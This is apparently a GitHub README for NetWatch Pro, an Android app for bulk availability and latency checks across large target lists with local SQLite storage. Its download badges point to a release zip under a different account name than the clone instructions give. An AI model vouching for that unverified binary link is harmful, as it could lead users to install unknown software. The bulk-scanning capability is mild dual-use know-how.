<div align="center">🚀 NETWATCH PRO

⚡ Advanced Local-First Network Monitoring for Android

<p>
<strong>Scan Smarter&nbsp;&nbsp;•&nbsp;&nbsp;Monitor Locally&nbsp;&nbsp;•&nbsp;&nbsp;Stay in Control</strong>
</p><br><a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
<img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NETWATCH%20PRO-00D4FF?style=for-the-badge&logo=android&logoColor=white" alt="Download NetWatch Pro">
</a><br><br>

<img src="https://img.shields.io/badge/RELEASE-v0.1.0-7C3AED?style=for-the-badge">
<img src="https://img.shields.io/badge/ANDROID-3DDC84?style=for-the-badge&logo=android&logoColor=white">
<img src="https://img.shields.io/badge/PRE--RELEASE-FFB000?style=for-the-badge"><br><br>

«🛡️ Local-first. Private. Powerful.

Your monitoring data stays on your device.»

</div>---

🌌 What is NetWatch Pro?

NetWatch Pro is a local-first Android monitoring platform built for managing, organizing, and checking large collections of targets from a single professional dashboard.

Designed with a focus on:

<table>
<tr>
<td align="center">🔒<br><strong>Privacy</strong><br><sub>Local-first data</sub></td>
<td align="center">⚡<br><strong>Performance</strong><br><sub>Concurrent processing</sub></td>
<td align="center">📊<br><strong>Visibility</strong><br><sub>Live statistics</sub></td>
<td align="center">🗃️<br><strong>Control</strong><br><sub>SQLite storage</sub></td>
</tr>
</table>---

✨ Core Capabilities

<table>
<tr>
<td width="50%">🔍 Advanced Scanner

Process a custom number of targets with configurable:

- ⚙️ Scan count
- ⚡ Concurrent workers
- ⏱️ Request timeout
- 📈 Real-time progress
- 📡 Online / Offline status
- 🕒 Latency measurement
- 🚀 Scan speed
- ⏳ ETA estimation

</td>
<td width="50%">📊 Live Monitoring

Track your scan in real time:

- 🎯 Total targets
- ✅ Completed targets
- 🟢 Online targets
- 🔴 Offline targets
- 📍 Current target
- 🚀 Processing speed
- ⏳ Estimated remaining time
- 🟣 Scan status

</td>
</tr><tr>
<td width="50%">🗃️ Local SQLite Database

Keep your monitoring data locally on the device.

- 🎯 Targets
- 🛰️ Scan sessions
- 📡 Scan results
- 📈 Latency data
- 🕒 Scan history

</td>
<td width="50%">🎯 Target Management

Organize large target collections with:

- 🏷️ Categories
- 🔖 Tags
- ⭐ Favorites
- 📝 Notes
- 📊 Status
- 🕒 Last check time

</td>
</tr>
</table>---

🔍 Scanner

🎯 Choose exactly how many targets to process

10
100
1,000
5,000
20,000+

⚙️ Scanner Configuration

Setting| Range
⏱️ Request Timeout| "500 ms" → "60,000 ms"
⚡ Concurrency| "1" → "64" workers

This allows users to balance performance, speed, and device resource usage.

---

📊 Real-Time Scan Statistics

During a scan, NetWatch Pro tracks:

<table>
<tr>
<td>🎯 Total</td>
<td>✅ Completed</td>
<td>🟢 Online</td>
<td>🔴 Offline</td>
</tr>
<tr>
<td>📍 Current Target</td>
<td>🚀 Speed</td>
<td>⏳ ETA</td>
<td>📈 Status</td>
</tr>
</table>Example:

┌─────────────────────────────┐
│       LIVE SCAN STATUS      │
├─────────────────────────────┤
│ Total:       5,000          │
│ Completed:   2,450          │
│ Online:      1,920          │
│ Offline:     530            │
│ Speed:       42 targets/sec │
│ ETA:         60 seconds     │
└─────────────────────────────┘

---

🗃️ Local Database

NetWatch Pro uses:

SQLite
@capacitor-community/sqlite

Database Overview

Table| Stores
🎯 "targets"| Target information and current status
🛰️ "scans"| Scan sessions and statistics
📡 "scan_samples"| Individual results and latency

Target Data

name
address
category
tags
notes
favorite
status
latency
availability
last_checked
created_at

Scan Data

started_at
finished_at
total
online
offline
avg_latency
status

All core monitoring data is designed to remain local on the device.

---

📈 Dashboard Analytics

The dashboard provides a quick overview of your monitoring environment.

<div align="center">📊 Total Targets| 🟢 Online| 🔴 Offline| ⚡ Avg Latency
Live count| Current status| Current status| Average response

</div>Additional insights include:

- 📡 Recent scan activity
- 🏷️ Category distribution
- 📈 Scan trends
- 🕒 Recent results
- ⚡ Latency information

---

🎯 Target Management

Manage your targets from one centralized interface.

Feature| Purpose
📝 Name| Identify targets
🌐 Address| Store target address
🏷️ Category| Organize targets
🔖 Tags| Flexible filtering
⭐ Favorites| Mark important targets
📄 Notes| Store additional information
📊 Status| Track availability
⚡ Latency| Monitor response time

---

🏷️ Categories & Tags

Organize targets using categories such as:

"General" · "Production" · "Development" · "Monitoring"

"Infrastructure" · "Websites" · "Services" · "Custom"

Tags provide an additional flexible organization layer for large collections.

---

📥 Import & Export

NetWatch Pro is designed for local data management.

Supported Workflows

<table>
<tr>
<td align="center">📥<br><strong>Import</strong><br><sub>Targets and data</sub></td>
<td align="center">📤<br><strong>Export</strong><br><sub>Application data</sub></td>
<td align="center">📄<br><strong>CSV</strong><br><sub>Data workflows</sub></td>
<td align="center">🗃️<br><strong>JSON</strong><br><sub>Backup workflows</sub></td>
</tr>
</table>---

💾 Backup & Restore

Create local backups containing:

- 🎯 Targets
- 🛰️ Scan history
- 📡 Monitoring results

Restore your data whenever needed without requiring a cloud backend.

---

🧹 Database Management

Database tools include:

- 💾 Backup all data
- 🔄 Restore from backup
- 🧹 Wipe database
- ♻️ Reset local data

«⚠️ Destructive database operations are protected by confirmation prompts.»

---

🛰️ Monitoring Workflow

<div align="center">1️⃣ Add or Import Targets

⬇️

2️⃣ Store Data Locally

🗃️ SQLite Database

⬇️

3️⃣ Configure the Scan

⚙️ Count · Timeout · Concurrency

⬇️

4️⃣ Process Targets

⚡ Concurrent Workers

⬇️

5️⃣ Collect Results

📡 Status · Latency · Availability

⬇️

6️⃣ Save History

📈 Persistent Scan Records

</div>---

🏗️ Architecture

NetWatch Pro uses a modular local-first architecture.

Layer| Technology| Role
🎨 Interface| React + TypeScript| Application UI
🎨 Styling| Tailwind CSS| Responsive design
⚡ Build| Vite| Development and production builds
📱 Mobile| Capacitor| Android runtime
🗃️ Database| SQLite| Local data storage
🧠 State| Zustand| Application state
🔍 Scanner| TypeScript| Target processing engine

🔍 Scanner Engine

The scanner is responsible for:

- ⚡ Concurrent workers
- ⏱️ Timeout management
- 📈 Progress tracking
- 🕒 Latency measurement
- 🟢🔴 Status classification
- 🗃️ Result persistence

---

📁 Project Structure

Location| Purpose
📱 "android/"| Native Android project
🌐 "public/"| Static assets
🧩 "src/components/"| Reusable UI components
🗃️ "src/data/"| Target data sources
🧠 "src/lib/db.ts"| Database operations
🔍 "src/lib/scanner.ts"| Scanner engine
📝 "src/lib/logger.ts"| Application logging
📤 "src/lib/export.ts"| Import and export
🛠️ "src/lib/utils.ts"| Shared utilities
📄 "src/pages/"| Application pages
🧠 "src/store/"| State management
🔷 "src/types/"| TypeScript definitions
⚙️ "capacitor.config.ts"| Capacitor configuration
📦 "package.json"| Dependencies and scripts
⚡ "vite.config.ts"| Vite configuration

---

🛠️ Tech Stack

<div align="center">Technology| Role
⚛️ React| User Interface
🔷 TypeScript| Type Safety
🎨 Tailwind CSS| Styling
🧩 Lucide Icons| Interface Icons
⚡ Vite| Build System
📱 Capacitor| Android Runtime
🤖 Android| Mobile Platform
🗃️ SQLite| Local Database
🧠 Zustand| State Management

</div>---

⚡ Quick Start

1️⃣ Clone the Repository

git clone https://github.com/danyalasa/cyber-net-probe.git

cd cyber-net-probe

2️⃣ Install Dependencies

npm install

3️⃣ Start Development

npm run dev

---

📱 Android Build

🔨 Build the Web Application

npm run build

🔄 Synchronize Android

npx cap sync android

🚀 Open Android Studio

npx cap open android

---

🔄 Development Workflow

Install

npm install

Develop

npm run dev

Build

npm run build

Sync Android

npx cap sync android

---

🔐 Privacy

NetWatch Pro follows a local-first philosophy.

🔒 Principle| Meaning
📱 Local Data| Data can remain on-device
🗃️ SQLite| Local database storage
🚫 No Core Server| No external server required for core workflows
🛡️ User Control| Users control their monitoring data

---

⚖️ Responsible Use

NetWatch Pro is intended for legitimate monitoring, testing, administration, and research of systems and targets that the user owns or has explicit permission to monitor.

«⚠️ Only scan systems and targets that you are authorized to monitor.»

Users are responsible for complying with applicable laws, terms of service, network policies, and authorization requirements.

---

🗺️ Roadmap

🟢 Current Direction

- [x] Premium dark dashboard
- [x] React + TypeScript architecture
- [x] SQLite local database
- [x] Target management
- [x] Scan history
- [x] Configurable scanner
- [x] Android integration
- [x] Backup & restore workflows

🟡 In Development

- [ ] Improved target import system
- [ ] Advanced scan analytics
- [ ] Improved real-time logging
- [ ] Better large-dataset performance
- [ ] Advanced filtering
- [ ] Improved mobile optimization

🔮 Future Ideas

- [ ] Scheduled monitoring
- [ ] Notification system
- [ ] Historical latency charts
- [ ] Availability reports
- [ ] Advanced target groups
- [ ] Custom monitoring profiles
- [ ] Exportable reports
- [ ] Multi-device synchronization

---

🤝 Contributing

Contributions, ideas, bug reports, and improvements are welcome.

Create a Feature Branch

git checkout -b feature/my-improvement

Then:

1. Make your changes
2. Test the project
3. Open a Pull Request

---

🐛 Bug Reports

When reporting a bug, please include:

- 📱 Device model
- 🤖 Android version
- 🏷️ Application version
- 🔁 Steps to reproduce
- 🎯 Expected behavior
- ❌ Actual behavior
- 🧾 Relevant error messages

---

⭐ Support the Project

If you find NetWatch Pro useful or interesting:

<div align="center">⭐ Star the repository

🐛 Report bugs

💡 Suggest features

🔧 Contribute improvements

📢 Share the project

</div>---

<div align="center">🛰️ NETWATCH PRO

Scan Smarter. Monitor Locally. Stay in Control.

<br>Built with ❤️ using:

React · TypeScript · SQLite · Vite · Capacitor

<br><br>

<a href="https://github.com/danyalasadpoor/cyber-net-probe/releases/download/Netwatch-pro/Netwatch-pro.zip">
<img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20LATEST%20BUILD-00D4FF?style=for-the-badge&logo=android&logoColor=white" alt="Download latest NetWatch Pro build">
</a><br><br>

⭐ If you like the project, consider starring the repository! ⭐

</div>
